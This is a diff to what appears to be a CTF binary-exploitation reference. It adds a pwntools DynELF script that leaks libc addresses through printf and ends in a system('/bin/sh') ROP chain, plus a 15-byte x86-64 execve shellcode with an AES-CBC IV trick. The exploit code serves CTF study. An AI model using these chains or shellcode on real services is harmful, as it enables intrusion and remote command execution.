@@ -13,6 +13,8 @@
   - [32-bit: PEXT (Parallel Bits Extract)](#32-bit-pext-parallel-bits-extract)
 - [Stack Pivot via xchg rax,esp (Crypto-Cat)](#stack-pivot-via-xchg-raxesp-crypto-cat)
 - [sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)
+- [DynELF Automated Libc Discovery (RC3 CTF 2016)](#dynelf-automated-libc-discovery-rc3-ctf-2016)
+- [Constrained Shellcode in Small Buffers (TUM CTF 2016)](#constrained-shellcode-in-small-buffers-tum-ctf-2016)
 
 For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).
 
@@ -388,3 +390,71 @@ rop += p32(bss_addr)
 ```
 
 **Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.
+
+---
+
+## DynELF Automated Libc Discovery (RC3 CTF 2016)
+
+When the remote libc version is unknown, use pwntools' `DynELF` to resolve function addresses at runtime by leaking memory through a format string or read primitive.
+
+```python
+from pwn import *
+
+elf = ELF('./target')
+io = remote('target.ctf', 1337)
+
+# Define a leak function that reads memory at a given address
+def leak(addr):
+    payload = b'A' * offset
+    payload += p64(elf.plt['printf'])  # call printf to leak
+    payload += p64(main_addr)          # return to main for next leak
+    payload += p64(addr)               # argument: address to read
+    io.sendline(payload)
+    data = io.recvuntil(b'prompt', drop=True)
+    return data
+
+# DynELF resolves symbols by parsing ELF structures in memory
+d = DynELF(leak, elf=elf)
+system_addr = d.lookup('system', 'libc')
+binsh_addr = d.lookup(None, 'libc')  # search for "/bin/sh" string
+
+log.success(f"system @ {hex(system_addr)}")
+
+# Build final ROP chain with resolved addresses
+payload = b'A' * offset
+payload += p64(pop_rdi_ret)
+payload += p64(binsh_addr)
+payload += p64(system_addr)
+io.sendline(payload)
+io.interactive()
+```
+
+**Key insight:** DynELF parses the remote ELF's `.dynamic` section, link map, and symbol tables to resolve any libc function without knowing the libc version. Requires a reliable memory read primitive (leak function) that can read arbitrary addresses.
+
+---
+
+## Constrained Shellcode in Small Buffers (TUM CTF 2016)
+
+When shellcode space is severely limited (e.g., 15-16 bytes due to AES block size), use minimal register setup and avoid unnecessary instructions.
+
+```asm
+; 15-byte execve("/bin/sh") shellcode for x86-64
+; Assumes: rsp points to writable area, "/bin/sh\0" follows shellcode on stack
+; Written in fasm syntax:
+
+lea rdi, [rsp + 0x19]    ; 4 bytes - pointer to "/bin/sh" on stack
+cdq                       ; 1 byte  - rdx = 0 (envp = NULL)
+push rdx                  ; 1 byte  - NULL terminator for argv
+push rdi                  ; 1 byte  - argv[0] = "/bin/sh"
+push rsp                  ; 1 byte
+pop rsi                   ; 1 byte  - rsi = argv = {"/bin/sh", NULL}
+push 0x3b                 ; 2 bytes - syscall number for execve
+pop rax                   ; 1 byte  - rax = 59
+syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
+; Total: 15 bytes
+
+; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:
+; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
+```
+
+**Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.
